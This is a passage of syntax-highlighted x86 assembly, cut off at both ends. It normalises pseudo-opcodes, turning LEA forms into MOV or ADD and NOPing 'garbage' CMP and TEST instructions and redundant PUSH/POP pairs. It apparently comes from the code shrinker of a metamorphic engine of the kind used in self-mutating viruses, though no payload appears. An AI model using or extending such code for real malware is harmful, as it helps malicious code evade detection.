                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Single_Next26</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Check second index</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">       </span><span class="sc1">; If it has a multiplicator, it's not</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@Single_Next26</span><span class="sc0">  </span><span class="sc1">; interesting</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Now +1 holds the first index (and if</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">      </span><span class="sc1">; there aren't multiplicators, this</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">         </span><span class="sc1">; must be &lt; 8 if there is an index)</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single_Next_LEA_CheckMOV</span><span class="sc0"> </span><span class="sc1">; If 8, there aren't indexes</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">      </span><span class="sc1">; ECX = Destiny register</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">       </span><span class="sc1">; Are they equal?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single_Next_LEA_CheckADD</span><span class="sc0"> </span><span class="sc1">; If so, check ADD</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Get the second index</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">      </span><span class="sc1">; Is there anyone?</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single_Next_LEA_CheckMOVRegReg</span><span class="sc0"> </span><span class="sc1">; If not, check MOV</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                  </span><span class="sc1">; Is equal to the destiny?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single_Next_LEA_CheckADDRegReg2</span><span class="sc0"> </span><span class="sc1">; If so, check ADD</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Get the first index</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">       </span><span class="sc1">; If it's not equal to the second,</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Single_End</span><span class="sc0">     </span><span class="sc1">; finish singles conversion</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">         </span><span class="sc1">; Set the first index as 8</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF00h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">       </span><span class="sc1">; Set LEA Reg,[2*Reg]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@EndCompressed</span><span class="sc0">  </span><span class="sc1">; End with compression flag</span><span class="sc0">
        </span><span class="sc5">@@Single_Next_LEA_CheckADDRegReg2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Get the immediate</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; If it's 0, set ADD Reg,Reg</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single_Next_LEA_SetADDRegReg_2</span><span class="sc0"> </span><span class="sc1">; If not, leave LEA</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Single_End</span><span class="sc0">
        </span><span class="sc5">@@Single_Next_LEA_CheckMOV</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; It DOESN'T hold anything more than</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">      </span><span class="sc1">; 8, but just in case</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single_Next_LEA_SetMOV</span><span class="sc0"> </span><span class="sc1">; If 8, set MOV Reg,Imm</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Get the destiny</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">       </span><span class="sc1">; If destiny == index, set ADD</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single_Next_LEA_SetADD_2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Get the Immediate</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; If it isn't 0, end</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Single_End</span><span class="sc0">
        </span><span class="sc5">@@Single_Next_LEA_SetMOVRegReg_2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Set MOV Reg,Reg (from LEA Reg,[Reg])</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF00h</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">41h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Single_SetInstruction</span><span class="sc0">
        </span><span class="sc5">@@Single_Next_LEA_SetADD_2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Set ADD Reg,Reg (from</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF00h</span><span class="sc0">  </span><span class="sc1">; LEA Reg,[Reg+Reg2])</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Single_SetInstruction</span><span class="sc0">
        </span><span class="sc5">@@Single_Next_LEA_SetMOV</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">      </span><span class="sc1">; Set MOV Reg,Imm (from LEA Reg,[Imm])</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF00h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc5">@@Single_Next_LEA_SetInstructionECX</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Single_SetInstructionECX</span><span class="sc0">
        </span><span class="sc5">@@Single_Next_LEA_CheckADD</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Check another possibility for ADD</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">        </span><span class="sc1">; If Index2 == 8 (not set), set</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single_Next_LEA_SetADD</span><span class="sc0">     </span><span class="sc1">; ADD Reg,Imm</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; If Index2 != 8 and memory dword</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; addition is != 0, end</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Single_End</span><span class="sc0">
        </span><span class="sc5">@@Single_Next_LEA_SetADDRegReg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Set ADD Reg,Reg</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF00h</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc5">@@Single_Next_LEA_SetADDRegReg_2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">          </span><span class="sc1">; Pseudo-opcode of ADD Reg,Reg</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Single_SetInstruction</span><span class="sc0">
        </span><span class="sc5">@@Single_Next_LEA_SetADD</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Set memory dword addition as the</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; Imm to add in ADD Reg,Imm</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Single_SetInstruction</span><span class="sc0">
        </span><span class="sc5">@@Single_Next_LEA_CheckMOVRegReg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; If the dword addition is 0, set</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; MOV Reg,Reg2</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Single_End</span><span class="sc0">
        </span><span class="sc5">@@Single_Next_LEA_SetMOVRegReg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">41h</span><span class="sc0">      </span><span class="sc1">; Pseudo-opcode of MOV Reg,Reg</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Single_SetInstruction</span><span class="sc0">

      </span><span class="sc5">@@Single_Next26</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Fh</span><span class="sc0">      </span><span class="sc1">; MOV Mem,Mem?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Single_Next27</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; If src == dest, set NOP</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; This could be, for example, a</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; compression of the sequence</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Single_End</span><span class="sc0">    </span><span class="sc1">; PUSH [EAX+123] / POP [EAX+123]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single_SetNOP</span><span class="sc0">

      </span><span class="sc5">@@Single_Next27</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">      </span><span class="sc1">; CMP instruction?</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@Single_Next28</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Ch</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">    </span><span class="sc5">@@Single_Next28</span><span class="sc0">
      </span><span class="sc5">@@Single_Next27_Common</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">     </span><span class="sc1">; Let's get the next instruction. It the</span><span class="sc0">
      </span><span class="sc5">@@Single_Next27_GetNextInstr</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">; next instruction is not a conditional</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">     </span><span class="sc1">; jump, this CMP is a garbage instruction,</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">0Bh</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; so we NOP it</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Single_SetNOP</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single_Next27_GetNextInstr</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">70h</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@Single_SetNOP</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">    </span><span class="sc5">@@Single_SetNOP</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Single_End</span><span class="sc0">


      </span><span class="sc5">@@Single_Next28</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">   </span><span class="sc1">; 8 bits CMP instruction?</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@Single_Next29</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Ch</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@Single_Next27_Common</span><span class="sc0">

      </span><span class="sc5">@@Single_Next29</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc0">       </span><span class="sc1">; Do the same with TEST. A single test</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@Single_Next30</span><span class="sc0">  </span><span class="sc1">; (without conditional jump) is garbage</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Ch</span><span class="sc0">       </span><span class="sc1">; for sure.</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@Single_Next27_Common</span><span class="sc0">

      </span><span class="sc5">@@Single_Next30</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">   </span><span class="sc1">; 8 bits TEST instruction?</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@Single_Next31</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Ch</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">
